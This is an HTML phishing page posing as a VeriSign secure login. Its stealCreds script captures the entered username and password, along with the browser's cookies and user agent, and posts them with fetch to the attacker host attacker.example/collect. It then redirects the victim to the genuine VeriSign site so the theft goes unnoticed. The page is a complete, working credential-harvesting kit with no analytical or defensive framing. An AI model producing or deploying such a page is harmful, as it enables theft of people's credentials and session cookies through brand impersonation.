<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>VeriSign Secure Login</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f2f6ff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .login-box {
      background: white;
      padding: 30px;
      width: 320px;
      border-radius: 8px;
      box-shadow: 0 0 10px rgba(0,0,0,0.15);
    }
    h1 {
      text-align: center;
      margin-bottom: 10px;
    }
    p {
      text-align: center;
      font-size: 13px;
      color: #666;
    }
    input {
      width: 100%;
      padding: 10px;
      margin: 10px 0;
      border: 1px solid #ccc;
      border-radius: 5px;
    }
    button {
      width: 100%;
      padding: 10px;
      background: #1a73e8;
      color: white;
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }
    button:hover {
      background: #1558b0;
    }
  </style>
</head>

<body>
  <div class="login-box">
    <h1>VeriSign</h1>
    <p>Secure Account Login</p>

    <form onsubmit="stealCreds(event)">
      <input type="text" id="user" placeholder="Username or Email" required>
      <input type="password" id="pass" placeholder="Password" required>
      <button type="submit">Login</button>
    </form>
  </div>

  <script>
    function stealCreds(e) {
      e.preventDefault();

      const username = document.getElementById("user").value;
      const password = document.getElementById("pass").value;

      // Exfiltration to attacker-controlled endpoint
      fetch("https://attacker.example/collect", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          username: username,
          password: password,
          cookies: document.cookie,
          userAgent: navigator.userAgent
        })
      });

      // Redirect victim to legitimate site to avoid suspicion
      window.location.href = "https://www.verisign.com/";
    }
  </script>
</body>
</html>
